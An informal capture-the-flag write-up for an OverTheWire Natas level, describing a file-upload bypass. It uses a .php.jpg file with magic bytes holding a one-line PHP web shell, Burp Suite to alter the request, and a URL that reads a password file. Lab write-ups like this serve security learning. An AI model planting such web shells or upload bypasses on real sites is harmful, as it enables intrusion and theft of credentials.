This level was very easy, i felt really confident beacose i've pacticed malicious file upload many times before.
However it wasn't complicated, i just created an php.jpg file and before i upload this file, i fired up burpSuite to capure the request.

This is the procedure:
	-> create a file
		-> touch test.php.jpg
			-> inside this file we write "magic numbers" (ask google), followed by some php code
				-> <?php system($_GET['c']); ?> (once this code gets uploaded we can give "c" whatever code we want, like= ..?c=whoami)
	-> click "upload" 
	-> capture the request with burpsuite and modify some headers just to be sure.
	-> forward the request and index the file uploaded

We should see something like http://natas11.natas.labs.overthewiere.org/uploads/21dw21f1.php?c=cat /etc/natas_webpass/natas13
and the password popping!
